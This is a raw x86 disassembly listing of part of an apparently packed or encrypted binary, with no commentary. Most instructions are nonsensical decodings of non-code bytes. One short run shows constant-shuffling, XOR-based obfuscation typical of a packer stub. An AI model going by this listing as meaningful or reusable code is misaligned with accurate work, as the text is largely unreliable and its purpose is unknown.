  403103:	adc    cl,al
  403105:	aaa    
  403106:	les    esp,FWORD PTR [esp+ecx*8]
  403109:	mov    ?,WORD PTR [edi+0xde546e5]
  40310f:	out    0xed,al
  403111:	push   cs
  403112:	add    BYTE PTR [edx+0x41555bd5],ch
  403118:	ds pop eax
  40311a:	xor    eax,0x4e1e1cef
  40311f:	push   esp
  403120:	push   es
  403121:	pop    ds
  403122:	add    BYTE PTR [ebx],bh
  403124:	xor    eax,0x1f94f7e0
  403129:	mov    ah,0x9
  40312b:	mov    al,0x7d
  40312d:	pop    eax
  40312e:	adc    BYTE PTR [edi-0xde3907],cl
  403134:	inc    ebp
  403135:	mov    al,0x74
  403137:	nop
  403138:	adc    al,dh
  40313a:	or     ch,bh
  40313c:	scas   eax,DWORD PTR es:[edi]
  40313d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40313e:	pop    ss
  40313f:	mov    dh,0x8c
  403142:	ja     0x403111
  403144:	pusha  
  403145:	addr16 pop ds
  403147:	mov    al,ds:0x2e61d47c
  40314c:	inc    ecx
  40314d:	mov    edi,0xe57ed787
  403152:	shr    BYTE PTR [esi-0x742015c6],1
  403158:	add    eax,0xffe523d2
  40315d:	sbb    BYTE PTR [eax+0x16],ch
  403160:	sbb    eax,ecx
  403162:	sar    DWORD PTR [edx],1
  403164:	stos   BYTE PTR es:[edi],al
  403165:	cmp    esi,DWORD PTR [ebx-0x58]
  403168:	push   cs
  403169:	jne    0x4030f6
  40316b:	int    0xb3
  40316d:	call   0x34c4:0xf36cd2db
  403174:	dec    eax
  403175:	dec    esp
  403176:	outs   dx,BYTE PTR ds:[esi]
  403177:	sbb    ch,BYTE PTR [ebp+0x2a]
  40317a:	and    eax,0x7059f24d
  40317f:	(bad)
  403182:	cs pop ss
  403184:	imul   esi,esi,0xffffff9b
  403187:	xor    DWORD PTR [esi-0xbf5d289],edx
  40318d:	mov    esi,0x8dcbfc3f
  403192:	loopne 0x4031a9
  403194:	or     bh,BYTE PTR [ebx+0x66]
  403197:	adc    DWORD PTR [esi+0x49],eax
  40319a:	pop    ss
  40319b:	jg     0x4031e3
  40319d:	xchg   BYTE PTR [ecx-0x3b],cl
  4031a0:	push   edx
  4031a1:	popf   
  4031a2:	cld    
  4031a3:	int    0x48
  4031a5:	push   cs
  4031a6:	sbb    bl,ch
  4031a8:	aad    0xb1
  4031aa:	(bad)  
  4031ab:	lods   al,BYTE PTR ds:[esi]
  4031ac:	daa    
  4031ad:	inc    eax
  4031ae:	or     al,0x38
  4031b0:	pop    esp
  4031b1:	(bad)  
  4031b2:	sbb    ecx,edi
  4031b4:	cmp    dl,BYTE PTR [ebp-0x30]
  4031b7:	fld    TBYTE PTR ds:0xe4605fc4
  4031bd:	or     eax,0x92511638
  4031c2:	push   ecx
  4031c3:	dec    edx
  4031c4:	or     bl,BYTE PTR [edi+0x63bb1d98]
  4031ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031cb:	iret   
  4031cc:	popa   
  4031cd:	mov    al,0x96
  4031cf:	scas   al,BYTE PTR es:[edi]
  4031d0:	add    edx,DWORD PTR [esi-0x780e4d75]
  4031d6:	in     al,0xaa
  4031d8:	imul   edi,DWORD PTR [edi-0x33],0x2fc5b24c
  4031df:	dec    DWORD PTR ds:0x279df353
  4031e5:	std    
  4031e6:	inc    edi
  4031e7:	and    eax,0x1ad8d61
  4031ec:	mov    bl,0x65
  4031ee:	jne    0x40325a
  4031f0:	jmp    0x4031fe
  4031f2:	adc    al,0xba
  4031f4:	pushw  ss
  4031f6:	bswap  sp
  4031f9:	cmc    
  4031fa:	sar    BYTE PTR [ebp+0x1c],0x95
  4031fe:	xor    ch,BYTE PTR [edx]
  403200:	enter  0x821d,0x69
  403204:	in     al,0x5
  403206:	push   eax
  403207:	std    
  403208:	dec    edx
  403209:	mov    esp,0x57f3577c
  40320e:	rol    DWORD PTR [ebp+0x36b60cc8],1
  403214:	(bad)  
  403215:	mov    al,0xe4
  403217:	add    eax,0x63f318a1
  40321c:	test   eax,0xa7682fe7
  403221:	aas    
  403222:	ja     0x4031de
  403224:	xor    eax,0x2b7bb220
  403229:	mov    ds:0x5116fd16,eax
  40322e:	int    0xb0
  403230:	ins    DWORD PTR es:[edi],dx
  403231:	inc    esi
  403232:	xlat   BYTE PTR ds:[ebx]
  403233:	cmp    ecx,esp
  403235:	(bad)  
  403236:	in     al,0x60
  403238:	mov    al,ds:0x50cdfbb2
  40323d:	and    eax,DWORD PTR [ebp+ebx*4-0x76]
  403241:	push   es
  403242:	stc    
  403243:	inc    ecx
  403244:	lahf   
  403245:	arpl   WORD PTR [edi],bp
  403247:	inc    ecx
  403248:	lods   eax,DWORD PTR ds:[esi]
  403249:	test   DWORD PTR [ecx-0x48],eax
  40324c:	mov    BYTE PTR [ecx+0x6c],bl
  40324f:	repz lock in al,dx
  403252:	jo     0x403261
  403254:	lds    ebx,FWORD PTR [eax+edx*8-0x5d]
  403258:	push   es
  403259:	mov    eax,ds:0x98f8d1ec
  40325e:	sbb    BYTE PTR [ebp+0x35],dl
  403261:	jmp    0x2123:0x9041e4ab
  403268:	es sub ebx,0xcccc7064
  40326f:	mov    bh,0x9b
  403271:	and    esp,DWORD PTR [esp+eiz*4]
  403274:	cdq    
  403275:	xchg   edx,eax
  403276:	jno    0x40326f
  403278:	(bad)  
  403279:	mov    gs,WORD PTR [ebx-0x41]
  40327c:	(bad)  
  40327d:	scas   eax,DWORD PTR es:[edi]
  40327e:	aas    
  40327f:	fndisi(8087 only) 
  403281:	xchg   esp,eax
  403282:	mov    ebp,0x55b120c5
  403287:	gs sbb ebx,edi
  40328a:	sbb    DWORD PTR [ecx],ecx
  40328c:	sub    eax,DWORD PTR [esi]
  40328e:	xcrypt-cbc (bad)
  40328f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403290:	push   ecx
  403291:	fwait
  403292:	clc    
  403293:	cwde   
  403294:	xchg   ecx,eax
  403295:	test   eax,0xb42beb7a
  40329a:	cmp    BYTE PTR [ecx],bl
  40329c:	imul   edx,ebx,0x37
  40329f:	dec    ecx
  4032a0:	adc    ch,ch
  4032a2:	or     al,0x60
  4032a4:	cld    
  4032a5:	(bad)  
  4032a6:	cmp    ch,dh
  4032a8:	mov    ch,0xb5
  4032aa:	push   eax
  4032ab:	cmp    BYTE PTR [edx-0x57],bl
  4032ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032af:	push   0xffffffd7
  4032b1:	or     al,0x78
  4032b3:	(bad)  
  4032b5:	ins    BYTE PTR es:[edi],dx
  4032b6:	sub    ah,0x6a
  4032b9:	js     0x403320
  4032bb:	sbb    al,0xb2
  4032bd:	push   cs
  4032be:	cmp    esi,ebp
  4032c0:	jmp    0x6820:0x12100830
  4032c7:	dec    esi
  4032c8:	dec    esi
  4032c9:	dec    esi
  4032ca:	enter  0x8de,0xa3
  4032ce:	shl    DWORD PTR [ebp+0x7dcc4623],1
  4032d4:	or     al,0x8c
  4032d6:	cmp    eax,0x8cc0f702
  4032db:	jp     0x40334d
  4032dd:	imul   esi,DWORD PTR [edx+0x19],0x810b8727
  4032e4:	dec    edi
  4032e5:	lods   eax,DWORD PTR ds:[esi]
  4032e6:	jmp    0x76054923
  4032eb:	or     DWORD PTR [ebx+0x25],esi
  4032ee:	pop    es
  4032ef:	and    eax,0x12f05ec2
  4032f4:	fcmovbe st,st(7)
  4032f6:	daa    
  4032f7:	nop
  4032f8:	cmp    bl,cl
  4032fa:	push   esp
  4032fb:	pusha  
  4032fc:	mov    cl,0x53
  4032fe:	lods   eax,DWORD PTR ds:[esi]
  4032ff:	(bad)  
  403300:	and    eax,0x719b5e52
  403305:	mov    al,ds:0x49741c33
  40330a:	ret    0xbbeb
  40330d:	ss push edi
  40330f:	pop    esi
  403310:	fiadd  WORD PTR [ebp-0x51b85244]
  403316:	adc    edi,ebp
  403318:	sub    edx,esi
  40331a:	adc    DWORD PTR [esi+0x1bf8bdd5],eax
  403320:	mov    edi,DWORD PTR [ebx+0x1e]
  403323:	and    eax,0x77eef166
  403328:	rol    ebp,1
  40332a:	pop    es
  40332b:	sahf   
  40332c:	in     eax,dx
  40332d:	sbb    al,0x1
  40332f:	and    DWORD PTR [esi+0x6c18a8d5],eax
  403335:	jmp    0x175dcf58
  40333a:	pop    ecx
  40333b:	xor    BYTE PTR [esi-0x69d1e6d5],cl
  403341:	call   eax
  403343:	in     al,0x38
  403345:	cli    
  403346:	push   ds
  403347:	jne    0x40331c
  403349:	xchg   ebp,eax
  40334a:	or     ecx,DWORD PTR [ecx+0x2]
  40334d:	ds (bad) 
  40334f:	mov    ebx,gs
  403351:	neg    BYTE PTR [edx+0x19]
  403354:	add    eax,0xbd5a9eee
  403359:	fidiv  WORD PTR [ebp-0x24bde2ae]
  40335f:	test   eax,0x64be6a2f
  403364:	jb     0x403323
  403366:	popf   
  403367:	jo     0x4033cb
  403369:	stos   DWORD PTR es:[edi],eax
  40336a:	sub    dl,al
  40336c:	xchg   edi,eax
  40336d:	stc    
  40336e:	jns    0x403388
  403370:	sahf   
  403371:	fimul  DWORD PTR [eax]
  403373:	push   ebx
  403374:	scas   al,BYTE PTR es:[edi]
  403375:	inc    esi
  403376:	shr    BYTE PTR [ecx+0x6b],0xa
  40337a:	and    al,0xb0
  40337c:	mov    ds:0x5c9285a1,eax
  403381:	fmul   DWORD PTR [ebp+0x10]
  403384:	loop   0x4033e9
  403386:	xor    BYTE PTR [ecx+0x6c5d9963],dh
  40338c:	push   cs
  40338d:	cmp    al,0xbd
  40338f:	or     BYTE PTR [ebx-0x267e8e19],bl
  403395:	sub    eax,0x9e098193
  40339a:	pop    ecx
  40339b:	ror    BYTE PTR [eax+0x80715d5],cl
  4033a1:	inc    edx
  4033a2:	mov    WORD PTR [eax-0x76],?
  4033a5:	mov    esp,0x26cc650a
  4033aa:	loope  0x40336a
  4033ac:	inc    dl
  4033ae:	pop    esi
  4033af:	ja     0x403410
  4033b1:	jmp    0x109863c9
  4033b6:	(bad)  
  4033b7:	data16 sub BYTE PTR [ebx+0x39],cl
  4033bb:	adc    al,dl
  4033bd:	add    DWORD PTR [edx+0x23bf4a66],ebx
  4033c3:	popf   
  4033c4:	jmp    0x688c:0x5ad9b5a6
  4033cb:	pop    esp
  4033cc:	jne    0x40335b
  4033ce:	jnp    0x403431
  4033d0:	mov    esi,0xa9da2c49
  4033d5:	sbb    al,0x29
  4033d7:	les    edi,FWORD PTR [ebp+0x61]
  4033da:	fwait
  4033db:	adc    al,0x7a
  4033dd:	stc    
  4033de:	mov    ds:0x882b4bf0,al
  4033e3:	popa   
  4033e4:	sub    ch,BYTE PTR gs:[edi-0x25]
  4033e8:	sti    
  4033e9:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033eb:	aas    
  4033ec:	mov    esp,0x7cb6753f
  4033f1:	pop    esi
  4033f2:	sub    BYTE PTR [ecx],dl
  4033f4:	shl    BYTE PTR [ecx+edx*1-0x3b],cl
  4033f8:	xor    al,BYTE PTR [ecx-0x44720b73]
  4033fe:	mov    ds:0x3d66725c,eax
  403403:	and    eax,0x3198e9f8
  403408:	outs   dx,BYTE PTR ds:[esi]
  403409:	cmp    ah,bl
  40340b:	arpl   cx,si
  40340d:	stos   DWORD PTR es:[edi],eax
  40340e:	or     BYTE PTR [edx+ebx*8-0x3d],0xf8
  403413:	adc    ecx,edi
  403415:	adc    esi,DWORD PTR [ecx-0x5e]
  403418:	mov    edi,0xaad8140b
  40341d:	pop    ebp
  40341e:	cs js  0x403406
  403421:	out    dx,eax
  403422:	adc    BYTE PTR [ecx],ch
  403424:	mov    ebp,0xb00246da
  403429:	enter  0xcfdd,0x36
  40342d:	dec    DWORD PTR [ecx+edx*1]
  403430:	cdq    
  403431:	dec    ebp
  403432:	je     0x40345f
  403434:	jecxz  0x4033f8
  403436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403437:	test   eax,0xb30cb154
  40343c:	ds push cs
  40343e:	mov    ds:0xbb1bfd07,eax
  403443:	(bad)
  403446:	sub    bl,BYTE PTR [edi-0x1adcb437]
  40344c:	mov    edi,0x4292f07b
  403451:	loopne 0x4034b3
  403453:	sbb    DWORD PTR [esp+eiz*4+0x6f],ecx
  403457:	add    DWORD PTR [eax+0x23],ecx
  40345a:	lods   eax,DWORD PTR ds:[esi]
  40345b:	fdiv   st(3),st
  40345d:	dec    esi
  40345e:	add    eax,0x35659866
  403463:	fwait
  403464:	pop    ss
  403465:	daa    
  403466:	dec    esp
  403467:	cwde   
  403468:	sub    eax,0x2d5390f2
  40346d:	sbb    edi,ebx
  40346f:	je     0x403474
  403471:	into   
  403472:	pop    ebx
  403473:	(bad)  
  403474:	out    dx,eax
  403475:	cmp    eax,0xa8ee76b2
  40347a:	add    DWORD PTR [ebx],ecx
  40347c:	aam    0x15
  40347e:	addr16 loop 0x40340c
  403481:	daa    
  403482:	xchg   edx,eax
  403483:	jnp    0x4034b2
  403485:	inc    ecx
  403486:	push   ds
  403487:	push   0xed2e3716
  40348c:	jo     0x40346f
  40348e:	push   ecx
  40348f:	movzx  esp,dx
  403492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403493:	ins    BYTE PTR es:[edi],dx
  403494:	adc    ecx,esp
  403496:	jmp    0xcf40828b
  40349b:	xor    al,0xd5
  40349d:	mov    ebx,0xb8956c0e
  4034a2:	enter  0x9714,0xf7
  4034a6:	inc    ebp
  4034a7:	inc    ebx
  4034a8:	cmp    al,0x18
  4034aa:	lea    esi,[eax+esi*8+0x40]
  4034ae:	push   edx
  4034af:	push   0x4fc01a4b
  4034b4:	icebp  
  4034b5:	in     al,0xbd
  4034b7:	adc    eax,0x85d0eb53
  4034bc:	adc    eax,0xec20949c
  4034c1:	mov    edx,0xfd8b707d
  4034c6:	mov    eax,ds:0xd17f8df2
  4034cb:	aam    0x2f
  4034cd:	sub    cl,BYTE PTR [ecx]
  4034cf:	or     BYTE PTR [ebp+eax*4-0x92d7117],dl
  4034d6:	mov    edi,0xede5953a
  4034db:	jnp    0x403537
  4034dd:	mov    eax,0xf45a2876
  4034e2:	adc    al,0x7d
  4034e4:	or     esp,esi
  4034e6:	dec    ebp
  4034e7:	sar    DWORD PTR [edx],1
  4034e9:	imul   ebx,DWORD PTR [ebx+ebx*4],0x5b
  4034ed:	pop    ebx
  4034ee:	add    DWORD PTR [edx+0xa],ecx
  4034f1:	jnp    0x403513
  4034f3:	fcmovu st,st(6)
  4034f5:	imul   eax,DWORD PTR [esi+edi*1-0x5c900517],0xfffffff8
  4034fd:	and    esp,0x2f
  403500:	and    al,0xd6
  403502:	and    al,0x7e
  403504:	(bad)  
  403505:	dec    eax
  403506:	pop    es
  403507:	ret    0x8b17
  40350a:	call   FWORD PTR [ecx]
  40350c:	jge    0x4034f4
  40350e:	pop    edi
  40350f:	loop   0x4034e8
  403511:	sub    eax,0x4a28a34c
  403516:	mov    bl,0xc
  403518:	mov    ecx,0xd02f5120
  40351d:	imul   esi,ecx,0x67
  403520:	shl    BYTE PTR [eax-0x6ab99c1b],0xb3
  403527:	mov    dh,0xc6
  403529:	jle    0x403567
  40352b:	pop    cx
  40352d:	push   esp
  40352e:	addr16 pop eax
  403530:	sahf   
  403531:	shl    BYTE PTR [edx+0x5c9e7bdb],1
  403537:	call   0xe2b24344
  40353c:	icebp  
  40353d:	add    ebx,esp
  40353f:	push   esp
  403540:	push   es
  403541:	xor    al,0xc0
  403543:	(bad)  
  403545:	psrlw  mm3,QWORD PTR [eax-0x1a]
  403549:	dec    edx
  40354a:	xor    eax,ecx
  40354c:	std    
  40354d:	xor    al,0xc1
  40354f:	lods   eax,DWORD PTR ds:[esi]
  403550:	nop
  403551:	push   ss
  403552:	(bad)  
  403553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403554:	or     esp,DWORD PTR [ebx-0x70392f2e]
  40355a:	outs   dx,DWORD PTR ds:[esi]
  40355b:	add    BYTE PTR [edx-0x5b],dl
  40355e:	adc    eax,0xf405e62e
  403563:	push   edi
  403564:	jne    0x40358d
  403566:	pop    eax
  403567:	jecxz  0x403510
  403569:	adc    cl,BYTE PTR [ebx-0x7]
  40356c:	sahf   
  40356d:	jecxz  0x403524
  40356f:	out    dx,eax
  403570:	cmp    DWORD PTR [ecx],esi
  403572:	arpl   WORD PTR [esi+0x20],bx
  403575:	lea    edx,[ebx-0x7e]
  403578:	mov    al,0x42
  40357a:	pusha  
  40357b:	popf   
  40357c:	push   ecx
  40357d:	retf   0xc91d
  403580:	cwde   
  403581:	popf   
  403582:	loop   0x403593
  403584:	jle    0x4035ce
  403586:	mov    al,0xb0
  403588:	cld    
  403589:	and    al,0x80
  40358b:	push   eax
  40358c:	aaa    
  40358d:	push   0xfffffffc
  40358f:	clc    
  403590:	adc    DWORD PTR [edi-0x3a438924],edx
  403596:	mov    esp,eax
  403598:	sbb    eax,0x5cc64696
  40359d:	and    cl,BYTE PTR [esi-0x2fb1b5be]
  4035a3:	add    DWORD PTR [esi],ecx
  4035a5:	mov    DWORD PTR [ebx+0x4c],ebx
  4035a8:	les    eax,FWORD PTR [ecx+ecx*2-0x26]
  4035ac:	fcom   QWORD PTR [esi]
  4035ae:	xchg   esi,eax
  4035af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b0:	scas   al,BYTE PTR es:[edi]
  4035b1:	dec    eax
  4035b2:	(bad)  
  4035b3:	fild   DWORD PTR ds:0x6bff0b58
  4035b9:	(bad)  
  4035ba:	jmp    0x40361a
  4035bc:	outs   dx,DWORD PTR ds:[esi]
  4035bd:	xlat   BYTE PTR gs:[ebx]
  4035bf:	fisubr DWORD PTR [edx]
  4035c1:	loop   0x4035df
  4035c3:	mov    eax,0x2600fb27
  4035c8:	jns    0x4035b0
  4035ca:	mov    esi,0x64ad0954
  4035cf:	idiv   DWORD PTR [ecx+0x35bde957]
  4035d5:	fs mov cs,edi
  4035d8:	es pop ds
  4035da:	inc    esi
  4035db:	push   edx
  4035dc:	mov    edx,0xdd1697b4
  4035e1:	das    
  4035e2:	pop    ds
  4035e3:	data16 xlat BYTE PTR ds:[ebx]
  4035e5:	jl     0x40363f
  4035e7:	div    dl
  4035e9:	loope  0x403582
  4035eb:	xor    DWORD PTR [esi],ebx
  4035ed:	xor    DWORD PTR [esp+ebx*2+0x74],edx
  4035f1:	or     BYTE PTR [edx+0x141c8a7e],ah
  4035f7:	pushf  
  4035f8:	adc    dh,BYTE PTR [edx]
  4035fa:	inc    esp
  4035fc:	cld    
  4035fd:	loopne 0x40361b
  4035ff:	push   DWORD PTR [esi+0x16]
  403602:	jb     0x4035a8
  403604:	pop    ecx
  403605:	add    dl,bl
  403607:	inc    esp
  403608:	imul   esi,DWORD PTR [eax+0x17],0xffffffc4
  40360c:	dec    edx
  40360d:	adc    BYTE PTR ds:0xa19b1105,al
  403613:	neg    DWORD PTR [eax-0x64]
  403616:	mov    ecx,0x78f43a3b
  40361b:	mov    ebp,0x8ea26ae3
  403620:	xor    eax,0x548e7f97
  403625:	jmp    0xeab770ef
  40362a:	out    dx,al
  40362b:	mov    ds:0xe1d5d0a1,al
  403630:	cmp    eax,ecx
  403632:	or     al,0x84
  403634:	icebp  
  403635:	fwait
  403636:	and    esi,esi
  403638:	pushf  
  403639:	scas   eax,DWORD PTR es:[edi]
  40363a:	and    eax,0xe0f48a5c
  40363f:	sbb    eax,0xc7c6a001
  403644:	ret    
  403645:	jb     0x403608
  403647:	jb     0x4036a4
  403649:	jg     0x4036b7
  40364b:	push   edi
  40364c:	xchg   esi,eax
  40364d:	mov    bh,al
  40364f:	push   esi
  403650:	mov    al,ds:0xbe89de10
  403655:	bound  esp,QWORD PTR [edi-0x37]
  403658:	xchg   ebx,eax
  403659:	stc    
  40365a:	jp     0x40361f
  40365c:	ficom  DWORD PTR [ebx]
  40365e:	rol    DWORD PTR [ecx-0x76],cl
  403661:	xchg   esp,eax
  403662:	dec    ebp
  403663:	popf   
  403664:	fwait
  403665:	mov    ch,0xc8
  403667:	pop    edi
  403668:	je     0x40362b
  40366a:	mov    ds:0xa85eacd5,eax
  40366f:	cdq    
  403670:	xchg   esi,eax
  403671:	inc    ax
  403673:	lods   eax,DWORD PTR ds:[esi]
  403674:	call   0xaea05ca0
  403679:	mov    al,ds:0x4b80e862
  40367e:	mov    ch,0x48
  403680:	add    eax,0x9ed60d16
  403685:	out    dx,eax
  403686:	add    DWORD PTR [esi+eiz*4],ecx
  403689:	push   ds
  40368a:	xchg   edi,eax
  40368b:	inc    esi
  40368c:	sub    DWORD PTR [edx-0x5c44804c],edx
  403692:	aam    0xc8
  403694:	sub    bl,0x35
  403697:	mov    ebx,0xeec305b8
  40369c:	lods   al,BYTE PTR ds:[esi]
  40369d:	xchg   BYTE PTR [ebx],cl
  40369f:	scas   al,BYTE PTR es:[edi]
  4036a0:	mov    cl,0x52
  4036a2:	add    BYTE PTR [esi],al
  4036a4:	repz push ebp
  4036a6:	push   ecx
  4036a7:	xor    BYTE PTR [ebx-0x3d],0xfa
  4036ab:	call   0xf6d50e46
  4036b0:	and    DWORD PTR [edx-0x4],edx
  4036b3:	inc    edi
  4036b4:	mov    cl,0x5e
  4036b6:	cmp    DWORD PTR [edi-0x56],0x1b
  4036ba:	add    eax,DWORD PTR [ebx+0x2]
  4036bd:	dec    ecx
  4036be:	mov    esp,0x7fb0dd80
  4036c3:	xchg   ecx,eax
  4036c4:	jb     0x40367b
  4036c6:	push   0x41
  4036c8:	icebp  
  4036c9:	sub    eax,0x7d6448f3
  4036ce:	adc    DWORD PTR [edx],ecx
  4036d0:	sbb    BYTE PTR [ecx-0x9d21b69],dh
  4036d6:	add    DWORD PTR [eax+0x4],ebp
  4036d9:	mov    eax,ds:0x47af29e7
  4036de:	mov    esp,0x24f90136
  4036e3:	inc    esi
  4036e4:	dec    ebx
  4036e5:	xor    bh,cl
  4036e7:	loope  0x403757
  4036e9:	ret    
  4036ea:	sbb    ecx,DWORD PTR [edi+0x35cc3968]
  4036f0:	mov    ds:0x9d9b3e72,eax
  4036f5:	mov    ah,0xa2
  4036f7:	lock inc ebx
  4036f9:	ss inc edx
  4036fb:	cmp    esp,DWORD PTR [edx+0x3c]
  4036fe:	dec    esp
  4036ff:	jb     0x4036ec
  403701:	aad    0xc4
  403703:	mov    ah,0x2
  403705:	out    dx,eax
  403706:	and    al,0xe4
  403708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403709:	mov    edx,0xb456a328
  40370e:	(bad)  
  403710:	int3   
  403711:	sub    al,0x6c
  403713:	xor    ecx,ebx
  403715:	pop    ebx
  403716:	outs   dx,BYTE PTR ds:[esi]
  403717:	ja     0x4036bc
  403719:	adc    eax,0x61db0da
  40371e:	add    DWORD PTR [edx+0x2f],ebp
  403721:	jp     0x403752
  403723:	test   al,0x36
  403725:	xchg   BYTE PTR [edi+0x4d8814c3],cl
  40372b:	(bad)  
  40372d:	pop    eax
  40372e:	clc    
  40372f:	(bad)  
  403730:	mov    eax,ds:0xdd7971a9
  403735:	add    cl,BYTE PTR [eax]
  403737:	loope  0x4037a6
  403739:	dec    ebx
  40373a:	xlat   BYTE PTR ds:[ebx]
  40373b:	or     DWORD PTR [ecx],eax
  40373d:	push   0xffffff83
  40373f:	push   esi
  403740:	out    0xc3,eax
  403742:	fld    DWORD PTR [edi]
  403744:	and    DWORD PTR [eax+0x5d3069ae],0x8fbcb653
  40374e:	dec    esp
  40374f:	fstp   TBYTE PTR [ebp-0x2a]
  403752:	test   al,0x14
  403754:	mov    dl,0x45
  403756:	scas   al,BYTE PTR es:[edi]
  403757:	mov    dl,0x31
  403759:	jb     0x4036e5
  40375b:	mov    dl,0xf3
  40375d:	div    BYTE PTR [edx]
  40375f:	popf   
  403760:	xchg   BYTE PTR [ecx],cl
  403762:	xchg   ebx,eax
  403763:	mov    ds:0xfa156334,eax
  403768:	arpl   WORD PTR ds:0xc2c66db7,cx
  40376e:	fcmovbe st,st(3)
  403770:	mov    bl,0xf5
  403772:	adc    dh,BYTE PTR [esi+0x4ab2642]
  403778:	jp     0x4037bb
  40377a:	out    0xfb,al
  40377c:	push   0xffffffa9
  40377e:	xchg   edx,eax
  40377f:	repnz popf 
  403781:	cdq    
  403782:	fstp   DWORD PTR [bx+si]
  403785:	cmp    ebx,DWORD PTR [edx-0x80]
  403788:	or     DWORD PTR [edi+0x15d2b80e],ebp
  40378e:	in     al,dx
  40378f:	inc    dx
  403791:	and    bh,ah
  403793:	jbe    0x40380e
  403795:	fmul   DWORD PTR ds:0x1ecaa06c
  40379b:	or     al,0x4b
  40379d:	cwde   
  40379e:	add    al,0xea
  4037a0:	nop
  4037a1:	mov    eax,0x64f51682
  4037a6:	inc    edi
  4037a7:	jp     0x40381e
  4037a9:	std    
  4037aa:	not    esp
  4037ac:	rol    DWORD PTR [esi],0xf2
  4037af:	std    
  4037b0:	and    DWORD PTR [eax],ebp
  4037b2:	out    dx,al
  4037b3:	mov    al,ds:0xd9772261
  4037b8:	loope  0x403792
  4037ba:	pusha  
  4037bb:	psrlq  mm7,mm4
  4037be:	hlt    
  4037bf:	lahf   
  4037c0:	mov    dl,0x6b
  4037c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037c3:	xor    ch,BYTE PTR [edi+0x3c]
  4037c6:	icebp  
  4037c7:	sbb    BYTE PTR [ebx+0x33],0xfc
  4037cb:	loop   0x403800
  4037cd:	mov    BYTE PTR [ebx],0xc7
  4037d0:	mov    DWORD PTR [ebp-0x80],eax
  4037d3:	lea    eax,[ebp-0x80]
  4037d6:	push   eax
  4037d7:	mov    eax,DWORD PTR [ebp+0xc]
  4037da:	xor    eax,esi
  4037dc:	add    eax,edi
  4037de:	push   eax
  4037df:	mov    eax,ds:0x42830f
  4037e4:	push   0x428265
  4037e9:	push   DWORD PTR [eax]
  4037eb:	call   0x423732
  4037f0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037f3:	mov    eax,DWORD PTR [ebp-0x14]
  4037f6:	mov    DWORD PTR [ebp-0x28],eax
  4037f9:	mov    DWORD PTR [ebp-0x20],0xf89c8533
  403800:	mov    edx,0xf89c85b1
  403805:	mov    DWORD PTR [ebp-0x20],edx
  403808:	lea    eax,[edx-0x1]
  40380b:	mov    DWORD PTR [ebp-0x20],eax
  40380e:	mov    DWORD PTR [ebp-0x8],edx
  403811:	mov    DWORD PTR [ebp-0x10],0xf89c85b2
  403818:	mov    edx,DWORD PTR [ebp-0x8]
  40381b:	xor    edx,esi
  40381d:	mov    ebx,0xffcd8f14
  403822:	sub    ebx,edx
  403824:	mov    DWORD PTR [ebp-0xc],ebx
  403827:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  40382e:	mov    edx,DWORD PTR [ebp-0x10]
  403831:	mov    DWORD PTR [ebp-0x24],ecx
  403834:	cmp    edx,eax
  403836:	je     0x4080be
  40383c:	mov    eax,DWORD PTR [ebp-0x8]
  40383f:	mov    edx,DWORD PTR [ebp-0x8]
  403842:	xor    eax,esi
  403844:	xor    edx,esi
  403846:	lea    ebx,[eax+edx*1+0x64e5d8]
  40384d:	mov    eax,DWORD PTR [ebp-0xc]
  403850:	xor    edx,edx
  403852:	div    ebx
  403854:	mov    eax,DWORD PTR [ebp-0x10]
  403857:	mov    ebx,DWORD PTR [ebp-0x8]
  40385a:	xor    eax,esi
  40385c:	xor    ebx,esi
  40385e:	jmp    0x405c1c
  403863:	mov    edi,0x41446183
  403868:	test   BYTE PTR [ebx-0x196ad685],cl
  40386e:	call   0x5fdd:0x865faff6
  403875:	jp     0x4038f1
  403877:	fstp   QWORD PTR [edi+0x7a]
  40387a:	jp     0x4038b4
  40387c:	push   ss
  40387d:	mov    ebx,0x24ec8ff5
  403882:	add    BYTE PTR [ebx],0xe4
  403885:	adc    DWORD PTR [edx],0xfffffff6
  403888:	pop    eax
  403889:	pop    esp
  40388a:	jns    0x403817
  40388c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40388d:	and    eax,0xe8454927
  403892:	jl     0x40387f
  403894:	hlt    
  403895:	mov    al,0xc5
  403897:	cwde   
  403898:	xor    ch,BYTE PTR [edx-0x4226e843]
  40389e:	or     DWORD PTR [ebx-0x7d],0xbd6abd97
  4038a5:	mov    ds:0xab00426e,al
  4038aa:	mov    eax,ds:0x81437c05
  4038af:	enter  0xad2,0x86
  4038b3:	shl    DWORD PTR es:[edx+edx*2+0x431ef46a],0xa3
  4038bc:	add    dh,al
  4038be:	sbb    DWORD PTR [ebx],eax
  4038c0:	loope  0x4038cb
  4038c2:	call   0xffe35329
  4038c7:	xor    bh,ah
  4038c9:	dec    eax
  4038ca:	je     0x4038b1
  4038cc:	pop    esi
  4038cd:	add    ebp,DWORD PTR [edi]
  4038cf:	scas   eax,DWORD PTR es:[edi]
  4038d0:	pop    ds
  4038d1:	and    cl,cl
  4038d3:	jle    0x4038f7
  4038d5:	mov    edi,0xffa43672
  4038da:	pop    esi
  4038db:	pop    esi
  4038dc:	icebp  
  4038dd:	std    
  4038de:	out    0x1,eax
  4038e0:	cs pop ecx
  4038e2:	cmp    BYTE PTR [ebx-0x4ce99f0e],ah
  4038e8:	cli    
  4038e9:	fimul  DWORD PTR [edx+0x36]
  4038ec:	lea    edx,[edi-0x2c16da5]
  4038f2:	inc    esi
  4038f3:	cmp    eax,0xf545b800
  4038f8:	mov    esi,0xb7a3f554
  4038fd:	jno    0x403929
  4038ff:	call   edi
  403901:	fadd   QWORD PTR [ecx+0x22]
  403904:	stc    
  403905:	pop    ds
  403906:	push   ecx
  403907:	xor    DWORD PTR [eax],esi
  403909:	xor    eax,0x5169ff7e
